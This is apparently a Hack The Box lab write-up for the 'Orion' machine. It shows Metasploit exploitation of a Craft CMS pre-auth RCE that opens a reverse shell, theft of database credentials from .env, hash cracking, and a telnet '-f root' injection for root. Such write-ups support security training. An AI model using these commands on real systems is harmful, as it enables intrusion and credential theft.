
# #HTB 


![[Pasted image 20260726151334.png|281]]


# HTB: Orion

**Machine IP:** `10.129.1.6`  
**Difficulty:** Easy  
**OS:** Linux  

---

---

## Step 1: Reconnaissance - Port Scanning

### Nmap Results:

```
nmap -n -Pn -sV -sC 10.129.244.146
```


![[Pasted image 20260726151935.png]]

**Open Ports:**

|Port|Service|Version|
|---|---|---|
|22/tcp|SSH|OpenSSH 9.6p1 Ubuntu|
|80/tcp|HTTP|nginx 1.18.0 (Ubuntu)|

**Important Finding:** HTTP redirects to `http://orion.htb/`

```bash
# Add to /etc/hosts
echo "10.129.244.146 orion.htb" | sudo tee -a /etc/hosts
```


---

## Step 2: Web Application Enumeration

**Website:** `http://orion.htb`

The site displays a **ReactorWatch** dashboard - a nuclear reactor monitoring system. The page appears to be a static Next.js dashboard with no visible login form.

### Technology Detection:
- **Framework:** Next.js
- **CMS:** Craft CMS 5.6.16 (detected via `X-Powered-By: Craft CMS` header)
- **Web Server:** nginx 1.18.0


![[Pasted image 20260726152025.png]]


---

## Step 3: Vulnerability Discovery

#### CVE-2025-32432 - Craft CMS Pre-Auth RCE

> **CVE-2025-32432:** A critical pre-authentication Remote Code Execution vulnerability affecting Craft CMS versions 3.x, 4.x, and 5.x before 5.6.17. The vulnerability exists in the `assets/generate-transform` endpoint and allows unauthenticated attackers to execute arbitrary code via a Yii deserialization gadget chain.

**Affected Versions:**
- < 3.9.15
- < 4.14.15
- < 5.6.17

**Target Version:** 5.6.16 (Vulnerable)

---

## Step 4: Exploitation - CVE-2025-32432

### Using Metasploit Module:

```
msfconsole
use exploit/linux/http/craftcms_preauth_rce_cve_2025_32432
set RHOSTS orion.htb
set RPORT 80
set PAYLOAD php/meterpreter/reverse_tcp
set LHOST 10.10.14.58
set LPORT 4444
set TARGET 0
set ASSET_ID 11
exploit
```


![[Pasted image 20260726152123.png]]


**Expected Output:**
```
[*] Started reverse TCP handler on 10.10.14.58:4444
[*] Running automatic check
[+] The target is vulnerable. Session path leaked
[*] Injecting stub & triggering payload...
[*] Sending stage (45739 bytes) to 10.129.244.146
[*] Meterpreter session 1 opened

meterpreter > getuid
Server username: www-data
```


![[Pasted image 20260726152155.png]]


---

## Step 5: Post-Exploitation Enumeration

### From Meterpreter Session:

```bash
meterpreter > shell
whoami
# www-data

pwd
# /var/www/html/craft/web

cd /var/www/html/craft
ls
# .env  composer.json  config  storage  vendor  web
```


### Finding Database Credentials:
```bash
cat .env
```

**Output:**
```
CRAFT_DB_DRIVER=mysql
CRAFT_DB_SERVER=127.0.0.1
CRAFT_DB_PORT=3306
CRAFT_DB_DATABASE=orion
CRAFT_DB_USER=root
CRAFT_DB_PASSWORD=SuperSecureCraft123Pass!
```


---

## Step 6: Database Credentials Extraction

### Connect to MySQL as Root:

```bash
mysql -u root -pSuperSecureCraft123Pass! -h 127.0.0.1
```

### Query the Database:
```sql
USE orion;
SELECT * FROM users;
```


![[Pasted image 20260726152241.png]]

**Output:**
![[Pasted image 20260726152257.png]]


---

## Step 7: Cracking Password Hashes

### Using Hashcat:
```bash
echo '$2y$13$e9zuohgFZzGtbQalcn9Mz.5PJbjxobO0GMbXo8NHp3P/B42LUg0lS' > hash.txt
hashcat -m 3200 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
```

![[Pasted image 20260726152311.png]]

- **Cracked Password:** `darkangel`


## Step 8: SSH Access as Adam

```bash
ssh adam@orion.htb
Password: darkangel
```


![[Pasted image 20260726152345.png]]


```bash
adam@orion:~$ whoami
adam
adam@orion:~$ cat user.txt
```


![[Pasted image 20260726152404.png]]


---

## Step 9: Privilege Escalation - Telnet Root Shell


```bash
adam@orion:/tmp$ USER="-f root" telnet -a 127.0.0.1
```

**Success!** This spawns a root shell.

```bash
root@orion:~# whoami
root
root@orion:~# cat /root/root.txt
5a7d3e357e20c48de33ea2a83878bcfd
```


![[Pasted image 20260726152506.png]]




---
---


